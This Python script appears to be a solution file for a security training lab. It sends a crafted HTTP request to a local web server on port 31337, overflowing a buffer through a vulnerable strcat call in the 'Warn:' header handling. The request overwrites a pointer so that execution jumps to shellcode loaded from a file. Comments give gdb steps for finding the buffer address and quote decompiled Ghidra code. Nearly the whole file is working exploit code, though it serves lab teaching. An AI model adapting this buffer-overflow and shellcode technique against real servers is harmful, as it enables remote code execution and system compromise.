#!/usr/bin/python3

from socket import *
import struct

addr = '127.0.0.1'
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

#exploit = b"\xeb\xfe" # uncomment and then run `htop` to see 100% core usage as proof of correct location/overwrite

exploit = b''
with open("exploit64", "rb") as fh:
    exploit = fh.read()		# exploit is 150 bytes

#address = 0x41414021 	   	# address of global buffer (created with the mmap() call -- see Ghidra)
address = 0x7ffff7dbdc54   # (alternative option on stack) see steps below on how to find this address: note: LDRNet students usually == 0x7ffff7dbdc54
# step 1: ./gdb webserver_lab8
# step 2: gdb> b strcat    	# can be found by placing breakpoint on the vulnerable strcat()
# step 3: gdb> r
# step 4: run this solution file in new terminal

# step 5: gdb> p $rbp-0x240    	# grab the stack address of the buffer
# step 6: gdb> x/gx <address>	# to validate buffer write
# note: that 0x7ffff7dbec50 is start of buffer,
# but we need to skip over the '199 ' (4B) so actual address is 0x7ffff7dbec54

PADLEN = 540

x = b'GET /asdf.vbs HTTP/1.1\r\n'
x += b'Warn:' + b'199 ' + exploit   # the 199 gets you past the (< 1 && > 200) bounds checks/warnings and on to the vulnerable strcat
''' Ghidra code snipped within containing the call to strcat FUN_00401897:
    if (iVar2 < 1) {
        printf("Warning: %s\r\n",&local_248);
    } else {
        __src = strtok(&local_248," ");
        sVar3 = strlen(__src);
        __dest = acStack583 + sVar3;
        if (iVar2 < 200) {
            strcat(__dest,local_28); <----------------------- OUR ULTIMATE GOAL
            printf("Warning %s: %s\r\n",__src,__dest);
        }
'''
x += b'A' * (PADLEN - len(exploit))
x += b'\xFF'*8			# Fill 8 byte arg (was orignially a ptr to a Warning string) used in strcat with F's
# ^^^ this invalid reference is what trigger the signal handler (which now has the ptr to your stack buffer/shellcode)
x += struct.pack("<Q", address)	# Fill func argument with the address of our code from the global buffer

x += b'\r\n'
x += b'\r\n'

s.send(x)
